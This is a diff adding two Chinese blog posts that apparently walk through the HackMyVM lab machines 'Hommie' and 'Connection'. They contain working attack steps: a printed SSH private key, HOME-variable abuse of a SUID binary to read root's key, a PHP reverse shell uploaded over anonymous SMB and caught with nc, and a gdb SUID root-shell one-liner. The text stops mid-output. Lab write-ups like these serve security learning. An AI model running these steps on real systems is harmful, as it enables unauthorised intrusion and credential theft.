@@ -185,6 +185,226 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/01/23/HackmyVM-Hommie/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lvzhouhang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/23/HackmyVM-Hommie/" class="post-title-link" itemprop="url">HackmyVM-Hommie</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-01-23 19:28:47 / 修改时间：19:39:53" itemprop="dateCreated datePublished" datetime="2025-01-23T19:28:47+08:00">2025-01-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    a4:a9:30:df:ef:44       (Unknown)</span><br><span class="line">192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)</span><br><span class="line">192.168.31.116  08:00:27:26:b1:6f       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)</span><br></pre></td></tr></table></figure>
+
+<p>ip为192.168.31.116，nmap扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.116 --min-rate=1000 -p-</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 06:29 EST</span><br><span class="line">Nmap scan report for hommie (192.168.31.116)</span><br><span class="line">Host is up (0.00041s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:26:B1:6F (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds</span><br></pre></td></tr></table></figure>
+
+<h1 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# curl 192.168.31.116</span><br><span class="line">alexia, Your id_rsa is exposed, please move it!!!!!</span><br><span class="line">Im fighting regarding reverse shells!</span><br><span class="line">-nobody</span><br></pre></td></tr></table></figure>
+
+<p>80端口目录也扫描不到，只给了一个提示，alexia的id_rsa泄露了，去看21端口</p>
+<h1 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ftp anonymous@192.168.31.116</span><br><span class="line">Connected to 192.168.31.116.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||35772|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0               0 Sep 30  2020 index.html</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; ls -al</span><br><span class="line">229 Entering Extended Passive Mode (|||35347|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    3 0        113          4096 Sep 30  2020 .</span><br><span class="line">drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..</span><br><span class="line">drwxrwxr-x    2 0        113          4096 Jan 23 06:12 .web</span><br><span class="line">-rw-r--r--    1 0        0               0 Sep 30  2020 index.html</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd .web</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||27864|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 106      113            35 Jan 23 06:12 1.phtml</span><br><span class="line">-rw-r--r--    1 0        0              99 Sep 30  2020 index.html</span><br><span class="line">-rw-r--r--    1 106      113          5493 Jan 23 06:09 rev.php</span><br><span class="line">226 Directory send OK.</span><br></pre></td></tr></table></figure>
+
+<p>21端口有匿名登录，存在.web目录，可以往80端口传文件，但是不解析php，只能放弃</p>
+<h1 id="tftp"><a href="#tftp" class="headerlink" title="tftp"></a>tftp</h1><p>扫描udp端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.116 --min-rate=1000 -sU --top-ports 20</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 06:34 EST</span><br><span class="line">Nmap scan report for hommie (192.168.31.116)</span><br><span class="line">Host is up (0.00053s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">53/udp    closed        domain</span><br><span class="line">67/udp    open|filtered dhcps</span><br><span class="line">68/udp    open|filtered dhcpc</span><br><span class="line">69/udp    open|filtered tftp</span><br><span class="line">123/udp   open|filtered ntp</span><br><span class="line">135/udp   closed        msrpc</span><br><span class="line">137/udp   open|filtered netbios-ns</span><br><span class="line">138/udp   open|filtered netbios-dgm</span><br><span class="line">139/udp   open|filtered netbios-ssn</span><br><span class="line">161/udp   closed        snmp</span><br><span class="line">162/udp   open|filtered snmptrap</span><br><span class="line">445/udp   open|filtered microsoft-ds</span><br><span class="line">500/udp   open|filtered isakmp</span><br><span class="line">514/udp   closed        syslog</span><br><span class="line">520/udp   open|filtered route</span><br><span class="line">631/udp   open|filtered ipp</span><br><span class="line">1434/udp  open|filtered ms-sql-m</span><br><span class="line">1900/udp  open|filtered upnp</span><br><span class="line">4500/udp  open|filtered nat-t-ike</span><br><span class="line">49152/udp open|filtered unknown</span><br><span class="line">MAC Address: 08:00:27:26:B1:6F (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds</span><br></pre></td></tr></table></figure>
+
+<p>tftp的服务开着，结合80端口给的提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# tftp 192.168.31.116</span><br><span class="line">tftp&gt; get id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>可以下载下来alexia的id_rsa</p>
+<p>ssh登录</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>找有suid的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">alexia@MiWiFi-RA71-srv:~$ find / -perm -u=s 2&gt;/dev/null</span><br><span class="line">/opt/showMetheKey</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/umount</span><br></pre></td></tr></table></figure>
+
+<p><code>/opt/showMetheKey</code>很可疑啊,运行一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">alexia@MiWiFi-RA71-srv:~$ /opt/showMetheKey</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7</span><br><span class="line">V0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0y</span><br><span class="line">Rn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOT</span><br><span class="line">gCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309j</span><br><span class="line">QMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBq</span><br><span class="line">kyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbI</span><br><span class="line">M2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjM</span><br><span class="line">dgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZW</span><br><span class="line">rH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0B</span><br><span class="line">tIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5T</span><br><span class="line">d/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/</span><br><span class="line">+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiE</span><br><span class="line">Ua47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2w</span><br><span class="line">pmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtk</span><br><span class="line">WeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jz</span><br><span class="line">bu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu</span><br><span class="line">3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO6</span><br><span class="line">0boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9z</span><br><span class="line">HlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbs</span><br><span class="line">y6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtY</span><br><span class="line">OZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08</span><br><span class="line">QPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gpp</span><br><span class="line">ivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN</span><br><span class="line">0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>把alexia的id_rsa输出了，将这个二进制文件拖下来放进ida看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setuid(0);</span><br><span class="line">  setgid(0);</span><br><span class="line">  system(&quot;cat $HOME/.ssh/id_rsa&quot;);</span><br><span class="line">  return 0;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>他是查看环境变量里HOME变量下的.ssh/id_rsa,可以修改HOME变量读取root的id_rsa</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alexia@MiWiFi-RA71-srv:~$ export HOME=/root</span><br><span class="line">alexia@MiWiFi-RA71-srv:/home/alexia$ env</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PWD=/home/alexia</span><br><span class="line">LOGNAME=alexia</span><br><span class="line">XDG_SESSION_TYPE=tty</span><br><span class="line">HOME=/root</span><br></pre></td></tr></table></figure>
+
+<p>再次运行拿到root的id_rsa，登录即可</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/01/22/HackmyVM-Connection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lvzhouhang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/22/HackmyVM-Connection/" class="post-title-link" itemprop="url">HackmyVM-Connection</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-01-22 22:07:19 / 修改时间：22:16:41" itemprop="dateCreated datePublished" datetime="2025-01-22T22:07:19+08:00">2025-01-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/script]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    a4:a9:30:df:ef:44       (Unknown)</span><br><span class="line">192.168.31.77   08:00:27:2a:5f:aa       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)</span><br><span class="line">192.168.31.187  a6:9b:e0:2d:30:9a       (Unknown: locally administered)</span><br><span class="line">192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.984 seconds (129.03 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>
+
+<p>ip为192.168.31.77，nmap扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/script]</span><br><span class="line">└─# nmap 192.168.31.77 --min-rate=1000 -p-</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 09:09 EST</span><br><span class="line">Nmap scan report for connection (192.168.31.77)</span><br><span class="line">Host is up (0.00064s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 08:00:27:2A:5F:AA (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.11 seconds</span><br></pre></td></tr></table></figure>
+
+<h1 id="445端口"><a href="#445端口" class="headerlink" title="445端口"></a>445端口</h1><p>开启了445端口</p>
+<p>用enum4linux进行枚举</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> =================================( Share Enumeration on 192.168.31.77 )=================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        share           Disk</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        IPC$            IPC       IPC Service (Private Share for uploading files)</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line"></span><br><span class="line">        Server               Comment</span><br><span class="line">        ---------            -------</span><br><span class="line"></span><br><span class="line">        Workgroup            Master</span><br><span class="line">        ---------            -------</span><br><span class="line">        WORKGROUP            CONNECTION</span><br><span class="line"></span><br><span class="line">[+] Attempting to map shares on 192.168.31.77</span><br><span class="line"></span><br><span class="line">//192.168.31.77/share   Mapping: OK Listing: OK Writing: N/A</span><br><span class="line">//192.168.31.77/print$  Mapping: DENIED Listing: N/A Writing: N/A</span><br><span class="line"></span><br><span class="line">[E] Can&#x27;t understand response:</span><br><span class="line"></span><br><span class="line">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*</span><br><span class="line">//192.168.31.77/IPC$    Mapping: N/A Listing: N/A Writing: N/A</span><br></pre></td></tr></table></figure>
+
+<p>smbclint可以匿名登陆share里有一个html，随便往里传一个文件发现在80端口访问到，传一个反弹shell的php文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/script]</span><br><span class="line">└─# smbclient  //192.168.31.77/share</span><br><span class="line">Password for [WORKGROUP\root]:</span><br><span class="line">Anonymous login successful</span><br><span class="line">smb: \&gt; cd html\</span><br><span class="line">smb: \html\&gt;</span><br><span class="line">smb: \html\&gt; put rev.php</span><br><span class="line">putting file rev.php as \html\rev.php (447.0 kb/s) (average 447.0 kb/s)</span><br><span class="line">smb: \html\&gt; exit</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/script]</span><br><span class="line">└─# nc -lvnp 5555</span><br><span class="line">listening on [any] 5555 ...</span><br><span class="line">connect to [192.168.31.129] from (UNKNOWN) [192.168.31.77] 45632</span><br><span class="line">Linux connection 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br><span class="line"> 09:12:44 up 4 min,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+
+<p>接收到shell了</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>用python获得一个更好的终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$  python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@connection:/$</span><br></pre></td></tr></table></figure>
+
+<p>查找suid文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@connection:/$ find / -perm -u=s 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s 2&gt;/dev/null</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gdb</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/gpassw</span><br></pre></td></tr></table></figure>
+
+<p>可以利用gdb进行suid提权</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/gdb/">https://gtfobins.github.io/gtfobins/gdb/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">www-data@connection:/$ gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br><span class="line">&lt;mport os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br><span class="line">GNU gdb (Debian 8.2.1-2+b3) 8.2.1</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by 